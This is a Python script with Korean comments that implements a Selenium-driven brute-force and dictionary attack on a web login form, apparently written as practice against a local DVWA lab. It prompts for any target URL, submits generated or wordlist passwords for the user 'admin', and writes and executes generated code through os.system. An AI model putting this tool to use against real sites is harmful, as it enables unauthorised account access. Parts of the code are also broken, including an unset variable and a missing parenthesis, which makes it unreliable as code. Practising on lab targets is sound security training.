#무차별대입 공격 bruteforce-selenium 방식 공격법 1단계(토큰 우회,랜덤 딜레이 파괴 구현안됨)
#코딩-성민우(귀찮아...)
#먼저 cmd에서 
#pip install --upgrade pip                 pip업글레이드
#python -m pip install selenium            selenium 다운로드
#python -m pip install webdriver-manager   webdriver-manager 다운로드를 먼저 해야합니다 
#근데 나는 잘 모르겠다... 하시면 파이썬에서 아래 코드를 실행하시면 자동으로 다운로드 됩니다
#
# import os
# os.system("pip install --upgrade pip")
# os.system("python -m pip install selenium")
# os.system("python -m pip install webdriver-manager"
#종종 pip관련해서 다운로드 했는데도 안되다고 하시는 분들 있는데 이는 pip 경로 문제로
#본인의 파이썬 pip파일이 어디 있는지 찾은 다음 cmd에서 명령어 cd로 이동하여
#pip파일이 있는 파일까지 들어가서 다운로드하면 해결됩니다

from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
import time
import random
import string
from _ast import If
import os




list1=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"
      ,"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]

list2=['~','!','@','$','%','^','&','*','(',')','-','_','=','+','|','/',"\'","\\",'<','>','?',',','.',"\""]
#자리잡고
li3=["1","2","3","4","5","6","7","8","9","0"]
li4=[]



def all(A,q):
    A=A
    q=q
    w=True
    while (w==True):
        if (q==1):
            li4=list1
            w=False
        elif (q==2):
            li4=list1+list2
            w=False
        elif (q==3):
            li4=list1+li3
            w=False
        elif (q==4):
            li4=list1+list2+li3
            w=False
        else:
            print("입력 외의 값입니다\n지정된 값 중에서 골라주세요\n")
            w=True

    list3=[]
    for i in range(A):
        list3.append(list1[0])
 
    if (A==1):
        x=-1
        driver = webdriver.Chrome(ChromeDriverManager().install())
        driver.get('http://localhost/3.dvwa/1.brutefource/1-3.bruteforce-GET.php')
        for i2 in range(len(li4)):
            list3[x]=li4[i2] 
            id = driver.find_element_by_name('username')
            id.send_keys("admin")
            pw = driver.find_element_by_name('password')
            pw.send_keys(list3[x])
            Search = driver.find_element_by_xpath('/html/body/div/div/div/div/form/input[4]')  
            Search.click()            
            
            
    elif (A>=2):
        f1=open("test3.py","rt",encoding="utf-8")
        c3=f1.read()

        for i in range(A-1):
            c2="def fir"+str(i+1)+"(x):\n    x=-x\n    for i2 in range(len(li4)):\n        list3[x]=li4[i2]\n        fir"+str(i)+"(-x-1)\n" 
            c3+=c2
            f2=open("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py","wt",encoding="utf-8")
            f2.write(c3)

        c2="fir"+str(i+1)+"("+str(i+2)+")"
        c3+=c2
        f2=open("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py","wt",encoding="utf-8")
        f2.write(c3)   
    
        f2=open("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py","rt",encoding="utf-8")
        c4=f2.read()
        c5="A="+str(A)+"\nq="+str(q)
        f2=open("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py","wt",encoding="utf-8")
        c6=c5+c4
        f2.write(c6) 
        
        
def start():
    A=int(input("무차별 공격을 시작하겠습니다.\n무차별 공격은 1번 \n사전 공격은 2번을 눌러 주세요"))
   
    if (A==1):
        D=input("공격할 사이크의 url을 입력해주세요")
        print("대입할 무작위적 패쓰워드의 최소길이와 최대길이를 적어주세요 ex) 4~12")
        A1=int(input("최소길이는?"))
        A2=int(input("최대길이는?"))
        random2(A1,A2,D)
        
        
    elif (A==2):
        D=input("공격할 사이트의 URL을 입력하여 주세요")
        print("사전 공격을 시작하겠습니다.")
        B=input("사전 공격으로 사용할 txt 파일을 선택하여 주세요\n ex) C:\\Users\\홍길동\\Desktop\\a.txt")
        file=open(B,"rt", encoding="utf-8")
        C=file.readlines()
        selenium1(D,C)



def random2(A1,A2,D):
    rev=[]
    if (A1==A2):
        q=int(input("어떤단어의 조합으로 할지 선택헤주세요\n1.영어-대소문자\n2.영어-대소문자+특수기호\n3.영어-대소문자+숫자\n4.영어-대소문자+특수기호+숫자"))
        all(A1,q)
        os.system("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py")
    elif (A1<A2):
        q=int(input("어떤단어의 조합으로 할지 선택헤주세요\n1.영어-대소문자\n2.영어-대소문자+특수기호\n3.영어-대소문자+숫자\n4.영어-대소문자+특수기호+숫자"))        
        for i in range(A2-A1):
            rev.append(A2-i)
        rev.append(A1)
        rev.sort()
        for i in range(len(rev)):
            all(rev[i],q)    
            os.system("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py")
    else:
        print("지정된 값이 이상합니다. 다시 실행해주세요")     
        
def selenium1(D,C):
    driver = webdriver.Chrome(ChromeDriverManager().install())
    da = Alert(driver)
    #로그인 입역
    driver.get(D)
    for i in range(len(C)):
        id = driver.find_element_by_name('username')
        id.send_keys("admin")
        pw = driver.find_element_by_name('password')
        pw.send_keys(C[i])
        Search = driver.find_element_by_xpath('/html/body/div/div/div/div/form/input[4]')  
        Search.click()

def clean():
    os.system("del C:\\Users\\tjdalsdn00\\Desktop\\aaa.py")  
        

if __name__ == '__main__':
    start()
    clean()
    
  
    #http://localhost/3.dvwa/1.brutefource/0.get/1-3.bruteforce-GET.php
    #E:\\python_coding\\dvwa\\1.Bruteforce\\dictionary_attack.txt
    
  